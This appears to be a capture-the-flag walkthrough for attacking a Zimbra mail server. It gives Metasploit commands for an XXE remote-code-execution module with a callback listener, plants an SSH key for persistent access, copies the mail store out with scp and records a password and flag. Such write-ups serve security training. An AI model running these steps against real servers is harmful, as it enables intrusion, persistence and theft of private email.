# Mail Server

1. Address: `172.16.3.67`
2. Find vulnerability: `https://www.exploit-db.com/exploits/46693`
3. Run Metasploit `msfconsole -q`

```shell
use exploit/linux/http/zimbra_xxe_rce
set RHOST 172.16.3.67
set RPORT 443

set LHOST 10.8.0.29
set LPORT 4747

# -j will run it as a JOB
run
```

> Attention: **Password: Zimbra2024**

4. Check SSH Keys (Create One, if needed)

```shell
cd ~/.ssh
ls -la
cat id_rsa.pub

# Create If You Don't Have one
ssh-keygen -t rsa
```

5. Set public Key:

```shell
echo "<your-pub-key>" > ~/.ssh/authorized_keys
  ```

6. Ssh into Server:

```shell
ssh -i ~/.ssh/id_rsa zimbra@172.16.3.67 -p 2200
```

7. Download Zimbra Data

```shell
scp -P 2200 -i ~/.ssh/id_rsa -r zimbra@172.16.3.67:/opt/zimbra/store/0 ./08-store0
```

8. Check Emails and Decode Files: `https://www.freeformatter.com/base64-encoder.html`
9. Flag: `MAZAPA_f7fcfe674431022cab7ae571058b1327`
